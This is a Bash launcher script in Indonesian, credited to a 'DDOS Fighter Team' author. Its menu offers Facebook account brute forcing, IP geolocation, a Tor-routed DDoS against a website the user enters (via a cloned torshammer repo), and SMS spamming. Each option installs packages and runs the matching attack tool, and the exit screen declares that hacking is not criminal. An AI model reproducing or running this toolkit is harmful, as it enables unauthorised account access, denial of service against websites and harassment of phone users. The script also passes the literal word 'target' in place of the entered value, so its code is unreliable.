#!/system/xbin/bash
clear
blue='\033[34;1m'
green='\033[32;1m'                                        
purple='\033[35;1m'
cyan='\033[36;1m'
red='\033[31;1m'
white='\033[37;1m'                                           
yellow='\033[33;1m'
sleep 1
toilet -f big -F gay "T00Ls" | lolcat
toilet -f big -F gay "DFT" 
echo ""      
echo "\033[32;1mAuthor : PRABU LINGGAR BUMI" 
echo "\033[35;1mTeam : DDOS FIGHTER TEAM"
echo "\033[33;1mKontak Me :  085222144996"
echo "\033[32;1m&" "\033[36;1mIndonesia Security Lite"
echo "\033[34;1m[============================[>"
sleep 1
echo ""
echo "\033[32;1mSilahkan Pilih Tools Yang mau Kamu pake:)?:"
echo "\033[36;1m"
echo "[===============================================]>"
echo $cyan "1.> MultiBrute Force Facebook"
echo "[===============================================]>"
echo $cyan "2.> Lacak IP"
echo "[===============================================]>"
echo $cyan "3.> DDOS website"
echo "[===============================================]>"
echo $cyan "4.> Spam Sms"
echo "[===============================================]>"
echo $cyan "0.> keluar"
echo "[===============================================]>"
echo "\033[32;1m"
read -p "[root@T00Ls-LinggarBumi:~#" bro

if [ $bro = 1 ] || [ $bro = 1 ]
then
clear
figlet "DDOS fighter team" | lolcat
echo "\033[33;1m"
sleep 3
apt upgrade && apt update
apt install python2
pip2 install mechanize
clear
cd module
python2 mbf.py
fi

if [ $bro = 2 ] || [ $bro = 2 ]
then
clear
figlet "DDOS fighter team" | lolcat
sleep 3
apt install git
apt install python
apt install python2
git clone https://github.com/maldevel/IPGeoLocation.git
mv IPGeoLocation $HOME
cd $HOME/IPGeoLocation
chmod +x ipgeoLocation.py
pip install -r requirements.txt
python ipgeolocation.py -m
clear
read -p "[Masukan IP/website]>" target
python ipgeolocation.py -t target
fi

if [ $bro = 3 ] || [ $bro = 3 ]
then
clear
toilet -f standard -F gay "DDOS fighter team" 
apt update
apt install git
apt install tor
git clone https://github.com/dotfighter/torshammer.git
mv torshammer $HOME
cd $HOME/torshammer
clear
read -p "Masukan Target==>:" target
python2 torshammer.py -T -t target
fi

if [ $bro = 4 ] || [ $bro = 4 ]
then
clear
toilet "DDOS fighter team"
apt install php -y
clear
php 1.php
fi

if [ $bro = 0 ] || [ $bro = 00 ]
then
echo "\033[32;1mDDOS CYBER TEAM"
sleep 1
echo "\033[33;1mWe Security"
sleep 1
echo " We Not Friends"
sleep 1
echo "We Are Family"
sleep 1
echo "Hacking Is Not Criminal;)"
sleep 1
echo "Ketika Sebuah Hayalan Tidak tercapai"
sleep 1
echo "Maka Terus lah BerJuang Dan Berusaha:)"
sleep 1
echo "\033[32;1mKarna Suatu Hari Nanti Kamu akan Mendapatkannya:)"
sleep 1
exit
fi